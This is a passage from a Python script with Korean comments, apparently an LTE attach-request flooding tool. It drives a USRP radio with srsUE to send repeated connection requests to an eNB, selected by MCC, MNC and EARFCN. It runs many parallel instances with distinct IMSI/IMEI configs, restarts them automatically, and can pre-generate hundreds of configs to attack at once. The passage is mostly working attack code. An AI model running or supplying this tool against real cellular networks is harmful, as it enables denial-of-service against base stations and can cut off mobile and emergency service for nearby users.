                        logger.warning(f"eNB는 찾았지만 프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                    else:
                        logger.warning(f"프로세스가 조기 종료되었습니다 (소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                else:
                    if enb_found:
                        logger.warning(f"eNB는 찾았지만 연결에 실패했습니다 (총 소요 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                    else:
                        logger.warning(f"eNB를 찾지 못했습니다 (총 대기 시간: {elapsed_time:.1f}초) - 재시작합니다...")
                
                # 재연결 (interval 대기 없이 즉시)
                # interval은 연결 시도 사이의 간격이므로, 연결이 끊어진 후 재연결은 즉시
                    
            except Exception as e:
                logger.error(f"연결 시도 중 오류: {e}")
                if self.running:
                    if self.interval > 0:
                        time.sleep(self.interval)
    
    def run_single_instance(self, instance_id: int):
        """단일 인스턴스 실행 (연결 후 계속 유지)"""
        unique_id = instance_id
        config_path = self.create_ue_config(unique_id)
        log_file = f"srsue_flooding_{instance_id}.log"
        
        try:
            logger.info(f"인스턴스 {instance_id} 시작 (IMSI 범위: {unique_id})")
            cmd = [
                "srsue",
                config_path,
                "--log.filename", log_file,
                "--log.all_level", "info"
            ]
            
            kwargs = {
                'stdout': subprocess.PIPE,
                'stderr': subprocess.PIPE,
            }
            if hasattr(os, 'setsid'):
                kwargs['preexec_fn'] = os.setsid
            elif sys.platform == 'darwin':
                kwargs['start_new_session'] = False
            
            process = subprocess.Popen(cmd, **kwargs)
            return process, config_path
            
        except Exception as e:
            logger.error(f"인스턴스 {instance_id} 시작 오류: {e}")
            return None, config_path
    
    def run_multiple_instances(self):
        """여러 프로세스를 동시에 실행 (각각 다른 IMSI/IMEI 사용)"""
        import threading
        
        logger.info(f"{self.instances}개의 인스턴스를 동시에 실행합니다...")
        
        # 각 인스턴스에 대한 프로세스와 설정 파일 경로 저장
        instance_data = []
        
        # 모든 인스턴스 시작
        for i in range(1, self.instances + 1):
            process, config_path = self.run_single_instance(i)
            if process:
                instance_data.append({
                    'instance_id': i,
                    'process': process,
                    'config_path': config_path
                })
                self.processes.append(process)
                # 각 인스턴스 사이에 약간의 지연 (USRP 충돌 방지)
                if i < self.instances:
                    time.sleep(0.5)
        
        logger.info(f"{len(instance_data)}개의 인스턴스가 실행 중입니다.")
        
        # 모든 프로세스가 종료될 때까지 대기
        try:
            while self.running:
                # 종료된 프로세스 확인 및 재시작
                for data in instance_data[:]:
                    if data['process'].poll() is not None:
                        # 프로세스가 종료됨
                        logger.warning(f"인스턴스 {data['instance_id']}가 종료되었습니다. 재시작합니다...")
                        # 기존 config 파일 삭제
                        if os.path.exists(data['config_path']):
                            try:
                                os.remove(data['config_path'])
                            except:
                                pass
                        # 재시작
                        new_process, new_config_path = self.run_single_instance(data['instance_id'])
                        if new_process:
                            # processes 리스트 업데이트
                            if data['process'] in self.processes:
                                idx = self.processes.index(data['process'])
                                self.processes[idx] = new_process
                            else:
                                self.processes.append(new_process)
                            data['process'] = new_process
                            data['config_path'] = new_config_path
                        # 각 인스턴스 사이에 약간의 지연 (USRP 충돌 방지)
                        time.sleep(0.5)
                
                time.sleep(1)  # 1초마다 확인
                
        except KeyboardInterrupt:
            pass
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        self.running = True
        
        # config 파일 모드 사용 여부 확인
        if self.use_configs:
            # config 파일에서 모든 설정 읽어서 사용
            config_files = self.get_config_files()
            if config_files:
                config_values = self.get_config_values(config_files[0])
                usrp_args_from_config = config_values['usrp_args']
                
                # 로그 출력용
                target_info = []
                if config_values['earfcn'] is not None:
                    target_info.append(f"주파수: EARFCN {config_values['earfcn']}")
                if config_values['mcc'] is not None:
                    target_info.append(f"MCC: {config_values['mcc']}")
                if config_values['mnc'] is not None:
                    target_info.append(f"MNC: {config_values['mnc']}")
                target_str = ", ".join(target_info) if target_info else "기본 설정"
                logger.info(f"Config 파일에서 설정 읽음: {target_str}")
                if usrp_args_from_config:
                    logger.info(f"Config 파일에서 USRP 인자 사용: {usrp_args_from_config}")
                else:
                    logger.info("Config 파일에 USRP 인자가 없습니다. 기본 장치 사용")
                
                # USRP 연결 확인은 건너뛰고 실제 실행 시 오류 처리
                # (config 파일에 이미 시리얼이 있으므로 확인 단계 생략)
                logger.info("USRP 연결 확인을 건너뛰고 실행합니다. (실제 실행 시 오류가 발생하면 확인하세요)")
            self.run_flooding_with_configs()
            return
        
        # 일반 모드: 명령어 인자 사용
        # USRP 장치 연결 확인
        if not self.check_usrp_connection():
            logger.error("USRP 장치 연결을 확인할 수 없습니다. 프로그램을 종료합니다.")
            raise RuntimeError("USRP 장치 연결 실패")
        
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"LTE Flooding 시작: 인스턴스 수: {self.instances}, 대상: {target_str}")
        
        if self.instances > 1:
            self.run_multiple_instances()
        else:
            # 단일 프로세스로 실행 (매번 다른 IMSI/IMEI 사용)
            self.run_flooding()
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 모든 프로세스 종료 (macOS와 Linux 호환)
        processes_to_kill = []
        if self.process:
            processes_to_kill.append(self.process)
        for proc in self.processes:
            if proc and proc.poll() is None:
                processes_to_kill.append(proc)
        
        for process in processes_to_kill:
            try:
                if sys.platform == 'darwin':
                    # macOS에서는 직접 terminate 사용
                    process.terminate()
                elif hasattr(os, 'killpg'):
                    # Linux에서는 프로세스 그룹으로 종료
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    except (OSError, ProcessLookupError):
                        process.terminate()
                else:
                    process.terminate()
                
                try:
                    process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    # 타임아웃 시 강제 종료
                    if sys.platform == 'darwin':
                        process.kill()
                    elif hasattr(os, 'killpg'):
                        try:
                            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                        except (OSError, ProcessLookupError):
                            process.kill()
                    else:
                        process.kill()
                    process.wait()
            except Exception as e:
                logger.error(f"프로세스 종료 오류: {e}")
                try:
                    process.kill()
                except:
                    pass
        
        self.process = None
        self.processes = []
        
        # 임시 설정 파일 정리 (모든 인스턴스의 config 파일 삭제)
        import glob
        config_pattern = "srsue_*.conf"
        for config_path in glob.glob(config_pattern):
            try:
                os.remove(config_path)
            except:
                pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default=None,
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200). 지정하지 않으면 기본 장치 사용"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=0.1,
        help="각 연결 시도 사이의 간격(초) (기본값: 0.1)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123). MCC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456). MNC만 지정하거나 MCC/MNC를 함께 지정할 수 있습니다."
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN). 특정 주파수를 지정합니다. (기본값: 3400)"
    )
    parser.add_argument(
        "--instances",
        type=int,
        default=1,
        help="동시에 실행할 프로세스 수 (기본값: 1). 여러 프로세스를 동시에 실행하여 flooding 효과를 높입니다."
    )
    parser.add_argument(
        "--generate-configs",
        type=int,
        default=None,
        metavar="N",
        help="N개의 config 파일을 미리 생성하고 종료합니다 (예: --generate-configs 500)"
    )
    parser.add_argument(
        "--config-dir",
        type=str,
        default="ue_configs",
        help="생성된 config 파일을 저장할 디렉토리 (기본값: ue_configs)"
    )
    parser.add_argument(
        "--use-configs",
        action="store_true",
        help="ue_configs 폴더의 모든 config 파일을 사용하여 동시에 공격합니다. eNB를 찾으면 모든 config 파일로 즉시 실행합니다."
    )
    
    args = parser.parse_args()
    
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        interval=args.interval,
        srsue_config="srsue.conf",
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn,
        instances=args.instances,
        use_configs=args.use_configs
    )
    
    # config 파일 생성 모드
    if args.generate_configs:
        flooder.generate_configs_batch(args.generate_configs, args.config_dir)
        logger.info(f"생성 완료! {args.generate_configs}개의 config 파일이 {args.config_dir}에 생성되었습니다.")
        return
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        
        # 메인 스레드 대기
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()

